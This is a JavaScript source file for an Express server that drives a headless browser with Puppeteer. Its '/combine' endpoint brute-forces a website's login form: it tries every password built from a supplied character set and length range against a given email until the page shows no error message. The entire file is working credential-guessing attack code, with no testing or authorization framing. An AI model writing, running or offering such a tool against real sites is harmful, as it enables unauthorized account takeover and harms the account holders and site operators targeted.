import express from "express";
import puppeteer from "puppeteer";

const app = express();
app.use(express.json());

app.get("/test", async (req, res) => {
    res.send("Hello World");
});

// Define the login handler
const handleLogin = async (
    page,
    emailValue,
    passwordValue,
    emailSelector,
    passwordSelector,
    buttonSelector,
    messageErrorSelector
) => {
    try {

        //remove the errorMessage from dom
        await  page.reload();
        // Fill out the login form
        await page.focus(emailSelector);
        await page.type(emailSelector, emailValue);
        await page.focus(passwordSelector);
        await page.type(passwordSelector, passwordValue);
        await page.click(buttonSelector);  // submit button click

        await page.click(buttonSelector);  // submit button click
        console.log("Form submitted");

        // Wait for a specific element or timeout (adjust selector as needed)
        let loginStatusElement = null;

        // Check if the error message is displayed on the page or not while login
        try {
            loginStatusElement = await page.waitForSelector(messageErrorSelector, { timeout: 5000 });
        } catch (error) {
            // Assuming if no error message appears within the timeout, login is successful
        }

        // Extract the login status message
        let loginStatus = null;
        if (loginStatusElement) {
            // Extract the text content of the element
            loginStatus = await page.evaluate(selector => {
                return document.querySelector(selector).innerText;
            }, messageErrorSelector);
        }

        // Determine login status
        if (!loginStatus) {
            console.log("Login successful");
            return true;
        }

        console.log("Login status:", loginStatus);
        return false;

    } catch (error) {
        // Handle errors during the login process
        console.error("Error during login process:", error);
        return false;
    }
}

app.post("/combine", async (req, res) => {
    const {
        url,
        emailValue,
        emailSelector,
        passwordSelector,
        buttonSelector,
        messageErrorSelector,
        charArray,
        minLength,
        maxLength
    } = req.body;

    let loginStatus = null;
    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    await page.goto(url);
    console.log("Page opened");

    // Generate all possible combinations of characters
    async function generateCombinations(prefix, characters, length) {
        if (length === 0) {
            return false;
        }

        for (let i = 0; i < characters.length; i++) {
            const newPrefix = prefix + characters[i];

            const result = await handleLogin(
                page,
                emailValue,
                `${newPrefix}`,
                emailSelector ? emailSelector : "input[type='email']", // default selector
                passwordSelector ? passwordSelector : "input[type='password']", // default selector
                buttonSelector ? buttonSelector : "button[type='submit']", // default selector
                messageErrorSelector
            );

            console.table([newPrefix, emailValue, result]);
            if (result) {
                return true; // If login is successful, return true
            }

            const childResult = await generateCombinations(newPrefix, characters, length - 1);
            if (childResult) {
                return true; // If login is successful in deeper recursion, return true
            }
        }

        return false; // No successful login found in this branch
    }

    for (let length = minLength; length <= maxLength; length++) {
        const result = await generateCombinations("", charArray, length);
        if (result) {
            loginStatus = "Login successful";
            break;
        }
    }

    if (loginStatus) {
        res.send(loginStatus);
    } else {
        res.send("Login failed");
    }

    await browser.close();
});

app.post("/test", async (req, res) => {
    const {
        url,
        emailValue,
        passwordValue,
        emailSelector,
        passwordSelector,
        buttonSelector,
        messageErrorSelector
    } = req.body;

    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    await page.goto(url);
    console.log("Page opened");

    const result = await handleLogin(
        page,
        emailValue,
        passwordValue,
        emailSelector ? emailSelector : "input[type='email']", // default selector
        passwordSelector ? passwordSelector : "input[type='password']", // default selector
        buttonSelector ? buttonSelector : "button[type='submit']", // default selector
        messageErrorSelector
    );

    if (result) {
        res.send("Login successful");
    } else {
        res.send("Login failed");
    }

    await browser.close();
});

app.listen(3000, () => {
    console.log("Server is running on port 3000");
});
